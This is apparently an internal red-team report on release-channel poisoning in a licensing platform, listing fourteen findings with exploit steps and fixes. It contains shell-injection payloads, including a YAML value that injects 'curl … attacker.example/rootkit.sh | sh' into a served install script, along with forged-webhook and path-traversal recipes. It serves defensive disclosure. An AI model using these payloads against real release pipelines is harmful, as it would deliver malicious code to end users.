# R6 — Release-channel poisoning

Red-team lane: **shipping malicious code to end users' machines.** Surfaces in scope:
`/webhooks/github`, `.pkey/` resync, `/<product>/install.sh`, `/<product>/appcast.xml`,
`/<product>/{cli,dmg}/…`, `/<product>/{version,changelog}`, and the portal
`/download/<token>` redirect.

PoCs: `packages/worker/test/attack/R6-release.test.ts` — **23 tests, all green**
(`npx vitest run test/attack/R6-release.test.ts` under Node 22). Every test asserts the
_current, vulnerable_ behaviour, so each one fails loudly when the corresponding fix lands.
No source file was modified.

## Trust boundary that everything below crosses

A platform admin performs a one-time `linkRepo` (`POST /manage/api/products`, platform-admin
only). **From that moment on, the contents of `.pkey/` in the linked repository's default
branch are the authoritative source of truth for that product's security policy** — pushed by
anyone with write access to the repo, with no admin review step, no diff approval, and no
allowlist of which fields a repo may change.

So the recurring answer to "who must be compromised" is: **one repo contributor / one
compromised CI token / one maintainer account on a linked repo** — _not_ a Polaris Key admin.
That is a much lower bar than the platform's own control plane, and it reaches end-user
machines.

---

## Findings

| ID    | Title                                                                                                                                      | Severity     |
| ----- | ------------------------------------------------------------------------------------------------------------------------------------------ | ------------ |
| R6-01 | `install.sh` RCE — repo-controlled `binary_name` injected into the served shell script                                                     | **Critical** |
| R6-02 | `install.sh` performs no integrity verification of the downloaded binary                                                                   | **High**     |
| R6-03 | Sparkle `edSignature` is relayed verbatim; `sparkle_ed25519_pub` is decorative; repo can set `requireSparkleSignature:false`               | **High**     |
| R6-04 | Artifact streaming relays a repo-chosen `Content-Type`, drops `Content-Disposition`, sets no `nosniff` → stored XSS on the platform origin | **High**     |
| R6-05 | Webhook resync applies `.pkey/` from an attacker-supplied `ref` with a self-attested branch gate                                           | **Medium**   |
| R6-06 | No replay protection on `/webhooks/github` — one captured delivery is a permanent state-rollback primitive                                 | **Medium**   |
| R6-07 | `channel_workflow` interpolated raw into an installation-token-bearing GitHub API URL                                                      | **Medium**   |
| R6-08 | `aarch64` / `amd64` route aliases raise an unhandled `TypeError` (500)                                                                     | **Low**      |
| R6-09 | `streamAsset` / `fetchTextAsset`: relative `Location` → 500; second hop not redirect-guarded                                               | **Low**      |
| R6-10 | No downgrade/rollback protection on any release surface                                                                                    | **Low**      |
| R6-11 | Served `origin` is taken from the request Host header                                                                                      | **Low**      |
| R6-12 | Portal `/download/<token>` open redirect + single-use TOCTOU (dormant)                                                                     | **Low**      |
| R6-13 | Latent CDATA breakout in `renderAppcast` `descriptionHtml` (unreachable today)                                                             | **Info**     |
| R6-14 | Push `commits[]` truncation makes `.pkey` change detection lossy                                                                           | **Info**     |

---

### R6-01 — `install.sh` RCE via repo-controlled `binary_name` — **Critical**

**Where**

- `packages/worker/src/release/install.ts:46-143` — `defaultInstallScript()` interpolates
  `binaryName` into a JS template literal at **13 sites**, including the top comment
  (`:49`), the three `case` arms (`:68-71`), the unconditional `URL=` assignment (`:92`), the
  `mktemp` template (`:106`), and several `echo` lines.
- `packages/worker/src/release/index.ts:387-408` — `handleInstall()` reads
  `cfg.binary_name` and serves the result as `text/x-shellscript`.
- `packages/shared-manifest/src/index.ts:752` —
  `binaryName: String(rel.binaryName ?? "")`. **No character class, no length cap, no
  validation of any kind.**
- `packages/worker/src/release/resync.ts:202-215` — `UPDATE release_config SET … binary_name = ?`
  from that unvalidated manifest value.
- `packages/worker/src/release/linkRepo.ts:191` — same value at link time.

**Severity justification.** The output is a shell script that the product's own documentation
tells users to run as `curl -fsSL … | sh`. A single string in a YAML file becomes arbitrary
code execution on **every user who installs or upgrades the CLI**, at the privilege of the
invoking user (and `install.sh` explicitly targets `/usr/local/bin` when writable). Blast
radius = the entire install base of that product. Unauthenticated to trigger (the endpoint is
`metadata_access: public` by default); the only precondition is one repo push.

**Preconditions / who must be compromised**

Anyone who can land a commit touching `.pkey/release.{json,yaml,yml}` on the linked repo's
default branch. That is: a repo contributor, a compromised GitHub PAT/Actions token with
`contents:write`, a maintainer account, or — via R6-05 — a holder of
`GITHUB_WEBHOOK_SECRET` pointing the resync at an unreviewed ref. **No Polaris Key admin
involvement is required after the initial link.**

**Exploit steps**

1. Push to `.pkey/release.yaml` on the linked repo's default branch:

   ```yaml
   release:
     ghOwner: acme-org
     ghRepo: acme-app
     binaryName: |-
       acme
       curl -fsSL https://attacker.example/rootkit.sh | sh
       #
   ```

2. GitHub delivers `push` → `handleGithubWebhook` (`githubWebhook.ts:96`) → `resyncRepo`
   → `UPDATE release_config SET binary_name = …`.
3. Any user runs `curl -fsSL https://key.plrs.im/acme/install.sh | sh`. The rendered script is:

   ```sh
   #!/bin/sh
   # acme
   curl -fsSL https://attacker.example/rootkit.sh | sh
   # installer — https://key.plrs.im
   …
   set -eu
   ```

   The payload is a **top-level line above `set -eu`** — it runs unconditionally.

A quote-only variant works without newlines: `binaryName: 'acme"; id > /tmp/pwned; :"'`
breaks out of the double-quoted `URL=` assignment at `install.ts:92` and out of every `case`
arm at `install.ts:68-71`.

> Note on the seeded hypothesis: the `case` **patterns** (`staging)`, `beta)`, `pr-[0-9]*)`)
> are static; the injected value sits in the double-quoted `NAME=` assignments. It is a
> quote-breakout, not a bare unquoted expansion — but the newline vector needs no quote at all
> and is unconditional, so the finding is strictly worse than the hypothesis stated.

**PoC status** — **Proven, 3 tests.** `R6-01` block in `test/attack/R6-release.test.ts`:
newline injection, quote breakout, and a full end-to-end
`linkRepo → signed push webhook → resync → GET /install.sh` chain.

**Fix direction**

1. Validate at the manifest boundary: `binaryName` must match `^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$`
   in `packages/shared-manifest/src/index.ts` (reject, don't coerce). Add the same guard as a
   defence-in-depth check in `resync.ts` and `linkRepo.ts` before the `UPDATE`/`INSERT`.
2. Stop string-interpolating into shell entirely: emit the value through a single
   `BINARY_NAME=$'…'` assignment produced by a real POSIX-shell quoter, and reference
   `$BINARY_NAME` everywhere else.
3. Apply the same treatment to `origin` and `cliBase` (see R6-11) and to `applyInstallTemplate`.

---

### R6-02 — `install.sh` performs no integrity verification — **High**

**Where** — `packages/worker/src/release/install.ts:109-123`:

```sh
curl -fL --progress-bar -o "$TMP" "$URL"   # or: wget -q -O "$TMP" "$URL"
chmod +x "$TMP"
mv "$TMP" "$TARGET"
```

No checksum, no detached signature, no `codesign --verify`, no `spctl --assess`. The module
docstring at `install.ts:12` asserts _"The binary is expected to be notarized, so there is NO
Gatekeeper/`xattr` workaround"_ — but nothing anywhere enforces or checks notarization, and
`curl`-downloaded files never receive the `com.apple.quarantine` xattr, so Gatekeeper is not
consulted on this path at all. The comment documents a control that does not exist.

**Severity justification.** This is the only thing that could have contained R6-01/R6-04 and
any compromise of the GitHub release assets. It also means the platform is a fully-trusted
single point of failure for CLI distribution: a Worker compromise, a D1 compromise, or a
GitHub release-asset swap all yield silent code execution.

**Preconditions / who must be compromised** — anyone who can replace a GitHub release asset
(repo write / Actions token), or anyone who can influence what the Worker streams.

**PoC status** — **Proven** (`R6-02` block asserts the download/chmod/mv sequence and the
absence of every integrity primitive: `shasum`, `sha256sum`, `openssl dgst`, `gpg`,
`minisign`, `cosign`, `codesign`, `spctl`).

**Fix direction** — publish a signed `SHA256SUMS` (minisign/cosign) per release; embed the
verifying public key **in the generated script** (it is served over TLS from the platform, so
it is a genuine pinning point) and `exit 1` on mismatch. Same for the `wget` branch. Also
verify at the gateway before streaming.

---

### R6-03 — Sparkle signature is relayed, never verified; the requirement is repo-writable — **High**

**Where**

- `packages/worker/src/release/index.ts:556-583` — the `sparkle:edSignature` is
  `fetchTextAsset(...).trim()` of a sibling `<dmg>.sig` release asset, copied straight into the
  feed. **`cfg.sparkle_ed25519_pub` is used only at `:560` and `:565` as a truthiness flag**;
  it is never imported as a key and no Ed25519 verification over the DMG bytes happens
  anywhere in the codebase.
- `packages/worker/src/release/appcast.ts:70-72, 112-137` — `buildAppcastItem`/`renderItem`
  simply XML-escape whatever they were handed.
- `packages/worker/src/release/index.ts:104-118` + `resync.ts:206-214` +
  `packages/shared-manifest/src/index.ts:793` — `.pkey/release.*` may set
  `artifactPolicy.requireSparkleSignature: false`, and it is honoured verbatim
  (`parsed.requireSparkleSignature !== false`). **The repo writes the platform's own
  signing-enforcement policy.**

**Severity justification.** Two distinct problems:

1. _No server-side verification._ The platform advertises "signed appcasts fail closed"
   (`health.ts:159`) but the only thing checked is that a `.sig` file **exists**. Its contents
   are never validated against `sparkle_ed25519_pub`. The stored public key is decorative.
2. _Repo-writable kill switch._ One line in `.pkey/release.yaml` removes the requirement and
   nulls the key, and the feed then renders with **no `sparkle:edSignature` attribute at all**.

**Does Sparkle client-side pinning save it?** _Partially, and only for the app-update path._
Sparkle 2 verifies the enclosure's EdDSA signature against `SUPublicEDKey` embedded in the
installed app bundle, so a poisoned DMG with a bogus/absent signature is rejected **by the
client**. That means:

- The **auto-update path is protected by the client, not by this platform** — the server
  contributes zero defence in depth, and `requireSparkleSignature:false` silently degrades any
  client that does not pin (Sparkle 1.x feeds, non-Sparkle consumers, custom updaters).
- The **direct DMG path is not protected at all**: `/<product>/dmg/<version>/<name>.dmg`
  (`index.ts:470-521`, `router.ts:156-160`) streams bytes with no signature involvement, and
  the portal/browser download flows use it.
- If the release pipeline is compromised (the realistic attacker for R6-01), the attacker
  uploads a DMG _and_ a matching `.sig` under their own key; Sparkle's pinned key rejects it —
  but only because of the client. If the product's EdDSA private key ever leaks, or if the app
  is rebuilt with the wrong key, the platform provides no independent check.

**Preconditions / who must be compromised** — repo write access to `.pkey/release.*` (to flip
the policy), or release-asset write access (to swap the `.sig`).

**PoC status** — **Proven, 2 tests.** Test 1 puts `TOTALLY-BOGUS-NOT-A-SIGNATURE==` in the
`.sig` asset with a well-formed Ed25519 public key configured, and asserts the garbage lands
verbatim in `sparkle:edSignature` while the configured key never appears in the output.
Test 2 drives `linkRepo → push .pkey/release.json with requireSparkleSignature:false →
webhook → appcast` and asserts a 200 unsigned feed.

**Fix direction**

1. Actually verify: `crypto.subtle.importKey("raw", …, {name:"Ed25519"})` with
   `sparkle_ed25519_pub` and verify the sidecar signature over the DMG bytes before emitting
   the feed. Fail closed on mismatch.
2. Move `requireSparkleSignature` (and the whole artifact policy) out of manifest control into
   admin-owned columns with the same "manifest-owned until an operator claims it" pattern
   already used for `fingerprint_policy_source` / `auto_issue_source` (`repo.ts:1002-1068`) —
   or simply refuse to let a manifest _weaken_ an existing policy.
3. Sign or verify the DMG on the `/dmg` path too, not just the appcast.

---

### R6-04 — Artifact streaming relays a repo-chosen `Content-Type` and strips `Content-Disposition` — **High**

**Where** — `packages/worker/src/release/github.ts:145-157`:

```ts
for (const h of ["Content-Type","Content-Length","Content-Range",
                 "Accept-Ranges","ETag","Last-Modified"]) { … }
```

The allowlist **copies the dangerous header (`Content-Type`) and drops the protective one
(`Content-Disposition: attachment`)** that GitHub sets on release-asset downloads.
`packages/worker/src/release/index.ts:516-520` then adds only `cache-control`. No
`x-content-type-options`, no CSP, no `x-frame-options` — `securityHeaders.ts`
(`appSecurityHeaders`) is never applied to any release response.

**Severity justification.** A GitHub release asset's `content_type` is chosen by whoever
uploads it. Upload an asset named `acme-arm64` with `content_type: text/html` and the platform
serves attacker HTML/JS **from `https://key.plrs.im`** — the same origin that hosts the admin
SPA at `/manage`, the customer portal at `/`, and every product's licensing API.
`wrangler.toml:47-49` confirms a single custom domain for all of it. Same-origin script
execution defeats the `X-PKey-CSRF` / `X-PKey-Portal-CSRF` double-submit design outright: the
admin session doc at `admin/session.ts:9-15` explicitly relies on "the API is same-origin
only". It is cross-tenant: product B's repo owner gets script execution in product A's admin's
browser.

Mitigating: `SameSite=Strict` on the session cookies means the victim must reach the URL as a
top-level navigation (a link/redirect), not a third-party iframe. Still trivially phishable,
and the missing `x-frame-options` means the response _is_ framable.

**Preconditions / who must be compromised** — anyone who can publish a GitHub release asset on
any linked repo (repo write / Actions token). Plus one admin or portal user clicking the URL.

**PoC status** — **Proven, 3 tests.** Asserts `content-type: text/html; charset=utf-8` is
relayed, `content-disposition` is `null`, and `x-content-type-options` /
`content-security-policy` / `x-frame-options` are all `null` on both the artifact and the
`install.sh` responses.

**Fix direction**

1. Do **not** relay upstream `Content-Type`. Emit `application/octet-stream` (or a small
   allowlist derived from the requested extension: `.dmg` → `application/x-apple-diskimage`).
2. Always set `Content-Disposition: attachment; filename="<sanitised asset name>"`.
3. Apply `x-content-type-options: nosniff`,
   `content-security-policy: default-src 'none'; sandbox`, and `x-frame-options: DENY` to every
   release response. Better: serve artifacts from a separate origin (`dl.plrs.im`) so a
   content-type slip can never touch session cookies.

---

### R6-05 — Webhook resync applies `.pkey/` from an attacker-supplied `ref` — **Medium**

**Where**

- `packages/worker/src/githubWebhook.ts:171` — `payload.after` → `resyncRepo(…, ref)`.
- `packages/worker/src/release/resync.ts:63,108-117` → `fetchRepoFile(…, ref)`.
- `packages/worker/src/release/github.ts:176` — `?ref=${encodeURIComponent(ref)}`.
- `packages/worker/src/githubWebhook.ts:138-141` — the "expected branch" gate compares
  `payload.ref` against `payload.repository.default_branch`, **both read from the same
  attacker-supplied body**. It is self-attestation, not a check.
- `packages/worker/src/githubWebhook.ts:143-146` — the `.pkey` path filter inspects
  `payload.commits[]` / `payload.head_commit`, also attacker-supplied.
- The payload's `installation.id` is never read and never compared to
  `release_config.gh_installation_id` (`PushPayload` at `:10-21` has no such field).

**What a holder of `GITHUB_WEBHOOK_SECRET` can rewrite** via `resync.ts:143-324`, for **any**
linked product, at **any** ref in that product's repo (including unreviewed branches, PR head
SHAs reachable through the repo's fork network, and arbitrary historical commits):

| Target                                                                                                                                                                     | Line                | Effect                                                                                       |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------- | -------------------------------------------------------------------------------------------- |
| `products` row: `name`, `compat_min/max`, `default_max_offline_days`, `default_device_limit`, `admin_group`                                                                | `resync.ts:143-155` | Compat window and device limits rewritten                                                    |
| `product_schema` (new active catalog version)                                                                                                                              | `:184-197`          | Config/secret catalog replaced                                                               |
| `release_config`: `channel_workflow`, `beta_branch`, `binary_name`, `sparkle_ed25519_pub`, `summary_marker`, `artifact_policy_json`, `metadata_access`, `artifacts_access` | `:202-215`          | **R6-01, R6-03, R6-07 all reachable from here**; access gating can be downgraded to `public` |
| `oidc_config` — `DELETE` then re-`INSERT` issuer / clientId / clientSecretSecret / redirectUris / groupRoleMap                                                             | `:221-238`          | Product's identity provider is replaced                                                      |
| `profiles`, `tiers` (`DELETE` + re-insert), `provisioning_config`, `edge_mint_config`                                                                                      | `:240-323`          | Entitlement policy replaced                                                                  |
| `fingerprint_policy_json`, `auto_issue_json`                                                                                                                               | `:160-181`          | Only if still `source='manifest'`                                                            |

Two things bound the damage: (a) `resync.ts:87-91` re-derives `owner`/`repo` from
`release_config`, so a forged payload cannot make product A read product B's repo — the
attacker-controlled residue is the **ref**; (b) `admin_group` is inert for authorization —
`admin/authz.ts:21-27` `canAdminProduct()` returns `isPlatformAdmin()` only, so writing
`admin_group` does **not** grant admin access in v1 (it only affects the product list in
`admin/handlers/me.ts:23`). Tiers/profiles are also refcount-protected (`:240-250`,
`:266-276`).

**Severity justification.** Medium rather than High because the precondition —
`GITHUB_WEBHOOK_SECRET` — is a platform-operator secret (see the Refuted section), so this is
an _escalation multiplier_ rather than a standalone entry point. But the `?ref=` design is
independently wrong even for legitimate deliveries: it makes the manifest applied to
production a function of a value in the request body rather than of the repo's protected
default branch, which structurally defeats branch protection and required review on `.pkey/`.

**Exploit steps** (given the secret): POST a hand-built push payload with
`ref: "refs/heads/main"`, `repository.default_branch: "main"`, `repository.owner.login` /
`.name` naming any linked repo, `head_commit.modified: [".pkey/release.json"]`, and
`after: "<sha of an unmerged PR branch containing the malicious .pkey/>"`. Sign it with the
secret. The worker fetches `.pkey/` at that SHA and applies the whole table above.

**PoC status** — **Proven, 2 tests.** One asserts `payload.after: "refs/pull/9/head"` flows
into every Contents API call as `?ref=refs%2Fpull%2F9%2Fhead`; the other drives a push that
rewrites `oidc_config.issuer` → `https://idp.attacker.example`, `oidc_config.client_id`, and
`products.admin_group` from the repo.

**Fix direction**

1. Never take the ref from the payload. Re-resolve the default branch server-side
   (`GET /repos/{o}/{r}` → `default_branch`) and fetch `.pkey/` from that branch, or verify
   `payload.after` is an ancestor of the _server-resolved_ default branch head before using it.
2. Validate `payload.installation.id === release_config.gh_installation_id` for every product
   the delivery touches.
3. Treat `commits[]` as a hint only; always resync when the delivery is for a linked repo
   (or diff `.pkey/` server-side).
4. Split manifest fields into "repo may own" vs "admin only" (`artifact_policy`,
   `metadata_access`/`artifacts_access`, `admin_group`, `oidc` belong in the latter) and
   require an explicit admin approval step for the second set.

---

### R6-06 — No replay protection on `/webhooks/github` — **Medium**

**Where** — `packages/worker/src/githubWebhook.ts:96-220`. The handler verifies the HMAC
(`:118-124`) and then proceeds. There is:

- no `X-GitHub-Delivery` dedupe (the header is never read),
- no timestamp/nonce/freshness check,
- no rate limit (`index.ts:168-169` calls the handler directly; nothing from `rateLimit.ts`
  or the `RL` Durable Object is on this path),
- no idempotency on `(repo, commit_sha)` — `product_sync_state` records `commit_sha`
  (`:180`, `:198`) but is never consulted before re-running.

**Severity justification.** A captured delivery (body + `X-Hub-Signature-256`) is a
**permanent, unlimited-use state-rollback primitive**. It is not merely "runs the same thing
twice": because `resyncRepo` does `DELETE FROM oidc_config / profiles / tiers /
provisioning_config / edge_mint_config` and re-inserts from the manifest at that ref, replaying
an _old_ delivery **reverts an operator's incident response** back to the manifest state of
that commit. GitHub's own App webhook redelivery UI hands the App owner exactly this artifact.
Each replay also fans out to `getInstallationToken` + up to 9 Contents API calls per matching
product — free amplification against the App's GitHub rate limit.

**Preconditions / who must be compromised** — anyone who has ever observed one valid delivery:
the GitHub App owner (via the deliveries UI), anyone with request-log access on any hop, or a
`GITHUB_WEBHOOK_SECRET` holder. No ongoing access to the secret is needed after capture.

**PoC status** — **Proven.** The `R6-07 REPLAY` test links a repo, captures one signed
delivery, replays it, then has an "operator" add a lockdown tier and quarantine `binary_name`
— replaying the identical bytes deletes the operator's tier and restores the manifest
`binary_name`. Both deliveries return `200 {ok:true}`.

**Fix direction** — persist `X-GitHub-Delivery` GUIDs (KV with a TTL, or a D1 table) and reject
duplicates; additionally short-circuit when `product_sync_state.commit_sha` already equals
`payload.after` and the last sync succeeded; add a per-IP and per-repo rate limit on the route.

---

### R6-07 — `channel_workflow` interpolated raw into an authenticated GitHub API URL — **Medium**

**Where** — `packages/worker/src/release/index.ts:340-360`:

```ts
runsUrl = `${base}/actions/workflows/${cfg.channel_workflow}/runs?branch=${encodeURIComponent(cfg.beta_branch)}…`;
```

`beta_branch` is encoded; `channel_workflow` is not. Its value comes from
`packages/shared-manifest/src/index.ts:753` — `String(rel.channelWorkflow ?? "")`,
unvalidated — via `resync.ts:206` / `linkRepo.ts:285`. The request at `:358` carries
`Authorization: Bearer <installation token>` (`:341-346`).

**Severity justification.** A repo-controlled value steers a token-bearing request off its
intended endpoint. `channelWorkflow: "../../../../../orgs/attacker-org/repos#"` normalises to
`https://api.github.com/orgs/attacker-org/repos` — the `#` truncates the intended query
string. Any `GET` on `api.github.com` reachable by the installation token can be issued. It is
a blind GET (the response is only mined for `workflow_runs`), so no data is returned to the
attacker and no state changes — hence Medium, not High. It is also a reliable 500: a response
without `workflow_runs` makes `for (const run of data.workflow_runs)` (`:367`) throw an
unhandled `TypeError`, taking out `beta`/`pr` selectors for that product.

**Preconditions / who must be compromised** — repo write on `.pkey/release.*`.

**PoC status** — **Proven.** Asserts the outgoing URL normalises to `/orgs/attacker-org/repos`
and carries `Authorization: Bearer ghs_installation_token`, and that the handler then rejects
with `TypeError`.

**Fix direction** — validate `channelWorkflow` against `^[A-Za-z0-9._-]+\.ya?ml$` at the
manifest boundary; `encodeURIComponent` it at the call site; build the URL with
`new URL()` + `searchParams` instead of template concatenation; and guard
`Array.isArray(data.workflow_runs)` before iterating.

---

### R6-08 — `aarch64` / `amd64` route aliases raise an unhandled `TypeError` — **Low**

**Where** — `router.ts:51` captures four arch tokens
(`^(?:[^/]+)-(arm64|aarch64|x86_64|amd64)$`); `index.ts:152-160` casts the captured alias
straight to `Arch` (`route.arch as Arch`); `assets.ts:17-20` keys `ARCH_TOKENS` on the two
**canonical** values only, so `ARCH_TOKENS["aarch64"]` is `undefined` and
`assets.ts:55` `[...wanted]` throws `TypeError: wanted is not iterable`.
`handleRelease` catches only `NotFoundError` (`index.ts:256-258`) and `index.ts:76` has no
outer try/catch, so the request 500s from the runtime.

**Severity justification.** Unauthenticated, remotely triggerable 500 on a public route
(`GET /<product>/dmg/1.2.3/x-aarch64.dmg`) after two upstream GitHub round-trips — burns the
App's rate-limit budget and produces noisy stack traces. No integrity impact.

**PoC status** — **Proven, 4 tests** (`cli`/`dmg` × `aarch64`/`amd64`).

**Fix direction** — normalise in the router (map `aarch64→arm64`, `amd64→x86_64`) or reject
non-canonical aliases with a 404; add a `default:` branch in `archMatches`; wrap
`handleRelease` in a catch-all that returns 500 without a stack.

---

### R6-09 — `streamAsset` redirect handling — **Low**

**Where** — `packages/worker/src/release/github.ts:121-132` (and the mirror at `:212-219`).

Two issues:

1. `new URL(loc)` (`:125`) throws `TypeError` on a relative `Location`, which is not a
   `NotFoundError`, so it escapes `handleRelease`'s catch → 500.
2. The re-fetch at `:131` is `fetchImpl(loc, { headers })` — **no `redirect: "manual"`**, unlike
   the first hop at `:119`. Any further redirect from the storage host is followed
   automatically with **no host re-check**, so the "SSRF guard" at `:126` covers exactly one
   hop.

The allowlist itself (`:89-95`) is otherwise sound: `github.com` exact,
`githubusercontent.com` exact, and `.githubusercontent.com` suffix —
`evil-githubusercontent.com` correctly fails the suffix test. The first hop drops
`Authorization` on the redirect (`:128-131`), which is correct.

**Severity justification.** Low: reaching the second hop requires GitHub itself to 302 into a
chain, so this is defence-in-depth erosion rather than a directly reachable SSRF.

**PoC status** — **Proven, 2 tests** (relative `Location` → `TypeError`; second-hop
`init.redirect` is `undefined` while the first hop's is `"manual"`).

**Fix direction** — wrap `new URL(loc)` in try/catch → `NotFoundError`; pass
`redirect: "manual"` on the storage hop too and loop with a bounded hop count, re-running
`isAllowedStorageHost` each time.

---

### R6-10 — No downgrade / rollback protection — **Low**

**Where** — `channels.ts:142-168` (`resolveChannel`) plus `index.ts:410-436` (`/version`) and
`:523-593` (appcast). `latest`/`stable` is defined purely as "first non-prerelease, non-draft
entry in the GitHub API's newest-first list". Nothing anywhere:

- records a version floor per product/channel,
- compares against any client-reported current version (no client version is ever accepted on
  these routes),
- distinguishes "v2 was never published" from "v2 was deleted/unpublished".

Deleting or un-publishing the newest GitHub release silently makes an older one `latest` for
every consumer, and `install.sh` will happily overwrite a newer binary with it.

**Severity justification.** Low for the Sparkle path (Sparkle refuses to offer an older
`sparkle:version` than installed) but real for `install.sh` and `/version` consumers, which
have no such logic. The responses are `cache-control: public` (`MOVING_CACHE`, `:80`), so a
brief downgrade window persists in caches. Combined with R6-02 (no integrity check) this is a
usable "roll everyone back to a known-vulnerable release" primitive for anyone with repo
release-delete rights.

**PoC status** — **Proven.** Asserts `/version` returns `2.0.0`, then returns `1.0.0` after the
newer release disappears from the list, with a `public` cache header.

**Fix direction** — persist a monotonic `min_version` per (product, channel) in
`release_config`, refuse to serve below it, and surface a `needs-attention` health check when
the resolved latest regresses.

**Status** — **Fixed in P0-02** (2026-09-30). See
[R6-10 — downgrade protection — Fixed](#r6-10--downgrade-protection--fixed) under Remediation.

---

### R6-11 — Served `origin` comes from the request Host header — **Low**

**Where** — `packages/worker/src/release/index.ts:185` —
`const origin = new URL(req.url).origin;` — then used for the install script's `ORIGIN=`
(`install.ts:62`), the documented `curl -fsSL <origin>… | sh` lines (`install.ts:52-59`), the
appcast `<link>` and every `enclosureUrl` (`index.ts:578-584`). In workerd, `req.url` is
derived from the `Host` header.

**Severity justification.** Low: `wrangler.toml:46-49` binds prod to a single
`custom_domain`, so Cloudflare routes on Host and an arbitrary Host will not reach the Worker
in the normal deployment. It becomes exploitable if a `workers.dev` subdomain or a wildcard
route is ever enabled, or if any downstream cache keys on path alone — the responses are
`cache-control: public, max-age=300`.

**PoC status** — **Proven** (a request to `https://attacker.example/djdl/install.sh` renders
`ORIGIN="https://attacker.example"` and `curl -fsSL https://attacker.example/… | sh`).

**Fix direction** — derive the origin from a configured `PUBLIC_ORIGIN` var, not the request;
disable `workers.dev` for prod.

---

### R6-12 — Portal `/download/<token>` open redirect + single-use TOCTOU — **Low (dormant)**

**Where** — `packages/worker/src/portal/api.ts:679-687` — a 302 to `artifact.source_url` with
no scheme/host allowlist. `packages/worker/src/portal/api.ts:649` reads `row.used_at` and
`:678` marks it used, with **seven `await`s in between** (`getPortalArtifact`,
`getPortalProductSettings`, `getPortalAccount`, `hasLinkedProductLicense`,
`hasUsableProductLicense`) — a textbook check-then-act window on an async (D1) database.

**Dormant.** Nothing in `packages/worker/src/` ever writes `release_artifacts` or
`release_metadata` — the only `INSERT`s are in `test/portal.test.ts`. `source_url` is
therefore currently un-attacker-controllable. The tables exist
(`migrations/0007_backend_contracts.sql:52,79`) and the read path is fully wired, so this arms
itself the moment an ingestion path lands.

**PoC status** — **Proven against seeded rows, 2 tests.** One redirects to
`https://attacker.example/pwned.dmg`. The other proxies the `Db` to yield on every call
(modelling D1's async round-trips — `better-sqlite3` is synchronous and hides the race) and
shows two concurrent redemptions of a one-shot token both return 302.

**Fix direction** — allowlist the redirect host (or proxy the bytes through `streamAsset`);
make redemption atomic with `UPDATE … SET used_at = ? WHERE token_hash = ? AND used_at IS NULL`
and treat `changes === 0` as already-used; validate `source_url`'s scheme/host at write time.

---

### R6-13 — Latent CDATA breakout in `renderAppcast` — **Info**

**Where** — `packages/worker/src/release/appcast.ts:65-67`:

```ts
? `\n      <description><![CDATA[${item.descriptionHtml}]]></description>`
```

`descriptionHtml` is neither escaped nor `]]>`-neutralised, so a payload containing `]]>`
closes the CDATA section early and can inject arbitrary sibling XML — including a second
`<enclosure url="…">` pointing at an attacker host.

**Unreachable today.** `buildAppcastItem` is called from exactly one place
(`index.ts:581-583`) and passes only `{ title }`. Nothing in `packages/worker/src/` ever sets
`descriptionHtml` or `minimumSystemVersion` (verified by grep). The obvious future wiring —
`extractSummary(release.body, …)` or `release.body` itself, both fully repo-controlled — would
arm it immediately.

**PoC status** — **Proven at the unit level** (a `descriptionHtml` payload injects
`<enclosure url="https://attacker.example/evil.dmg" />` into the rendered feed), and confirmed
unreachable through the handler.

**Fix direction** — replace `]]>` with `]]]]><![CDATA[>` before embedding (or just XML-escape
and drop CDATA). Note also that `stripMarkdown` (`changelog.ts:38-45`) is **not** an HTML
sanitiser — it strips emphasis and link syntax and leaves raw HTML intact — so it must never be
treated as one if release notes are ever piped into this or into any HTML surface. Today
`summary` terminates in the `/changelog` JSON body (`index.ts:455-467`); no consumer in this
repo renders it as HTML (no raw-HTML injection sink exists anywhere in `packages/admin` or
`packages/worker`), and no SDK/CLI reads `/changelog`.

---

### R6-14 — `.pkey` change detection is lossy — **Info**

**Where** — `githubWebhook.ts:68-81, 143-146`. `changedPaths()` unions `head_commit` and
`commits[]`. GitHub **truncates `commits[]` to 20 entries** on push payloads. A push of >20
commits where the `.pkey/` edit is not in the first 20 and not the head commit will be filtered
out as `no-pkey-changes` and never resynced. Fail-closed (a stale product, not a poisoned one),
but it makes the sync state silently wrong and encourages operators to trust it.

**Fix direction** — as in R6-05: drop the payload-derived path filter and resync
unconditionally for linked repos (server-side diff if churn is a concern).

---

## Refuted

**H2 — "One global `GITHUB_WEBHOOK_SECRET` shared by all repos; any repo owner who has held it
can forge a payload naming another linked `owner/repo`."** — **Refuted as stated.**
`GITHUB_WEBHOOK_SECRET` is the **GitHub App's** webhook secret, a Worker secret held only by
the platform operator (`docs/DEPLOYMENT.md:136-155` — "Create or confirm the GitHub App named
`polaris-key` … The webhook secret is an operator-chosen high-entropy value. It must exactly
match the Worker secret"; `docs/RUNBOOK.md:163-165`). Repo owners install the App; they never
receive or configure the secret. So a repo owner cannot forge deliveries for another tenant.
_What survives:_ one secret covers every installation with no per-installation binding — the
payload's `installation.id` is never validated against `release_config.gh_installation_id`
(`githubWebhook.ts:10-21` does not even model the field). A single secret compromise is
therefore a cross-tenant forgery capability. Kept as part of **R6-05** rather than as its own
finding.

**H1 (partial) — "the webhook can rewrite `admin_group` to take over the product."** —
**Refuted.** `resync.ts:152` does write `products.admin_group` from the manifest, but
`admin/authz.ts:21-27` `canAdminProduct()` ignores it entirely and returns `isPlatformAdmin()`;
`hasAnyAdminGrant` (`:30-38`) likewise. Product groups are documented as "reserved metadata for
a future RBAC pass" and grant nothing in v1. The only effect is which products appear in
`GET /manage/api/me` (`admin/handlers/me.ts:23`). Latent — it becomes an authorization bypass
the moment product-level RBAC is implemented.

**H1 (partial) — "a forged payload can make product A resync from product B's repo."** —
**Refuted.** `resync.ts:86-91` re-derives `owner`/`repo` from the product's own
`release_config` and ignores the payload coordinates; `repo.ts:263-279`
`listProductsByGithubRepo` matches case-insensitively on the stored coordinates. The only
attacker-controlled residue is the `ref` (R6-05). Also `resync.ts:134-139` rejects a manifest
whose `product.slug` does not match the product being resynced, so a manifest cannot rename or
retarget a product.

**H8 — "CDATA breakout in `appcast.ts:65-67`."** — **Confirmed as a real defect but
unreachable.** Downgraded to Info (**R6-13**): no production caller ever supplies
`descriptionHtml`.

**H9 — "portal open redirect."** — **Confirmed in code, but dormant.** Downgraded to Low
(**R6-12**): no production code writes `release_artifacts.source_url`.

**"`streamAsset`'s host allowlist is not airtight"** — **true, but not for the suspected
reason.** The suffix check at `github.ts:89-95` is correctly anchored (`.githubusercontent.com`,
so `evil-githubusercontent.com` fails) and `Authorization` is correctly dropped on the storage
